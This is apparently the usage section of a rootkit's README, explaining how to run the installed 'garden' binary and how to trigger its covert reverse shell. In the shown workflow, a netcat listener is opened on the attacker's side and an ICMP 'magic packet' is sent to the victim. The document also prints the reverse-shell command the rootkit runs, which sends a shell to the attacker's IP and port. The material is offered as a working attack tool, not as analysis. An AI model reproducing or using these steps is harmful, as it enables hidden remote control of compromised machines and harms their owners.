## Usage

**General**

After configuration and installation, most of the usage of this rootkit will originate from the installed `garden` binary in the `/` directory. Run `$ /garden` for an overview of the options.

**Reverse Shell**

To use the reverse shell, you must input an IP address and port during the setup process. The reverse shell will only connect to this IP address and this port so that installing this rootkit on a machine doesn't leave the machine completely exposed.

The reverse shell can be activated by sending an ICMP ping to the IP address of the machine you are attackiing. Make sure to have a `netcat` listener already open on the port you entered during setup.

On `macOS`, you would enter this series of commands to open a reverse shell:

```bash
$ nc -u -l PORT  # Open a netcat listener in one tab
# Open a new terminal tab
$ ping IP_ADDRESS_BEING_ATTACKED # Send magic packet
```

When the machine being attacked gets the ping, it will compare the source IP address of the ping to the IP address entered during configuration. If they match, it will run `$ echo "sh -i >& /dev/udp/IP/PORT 0>1&" | bash` to spawn a reverse shell.
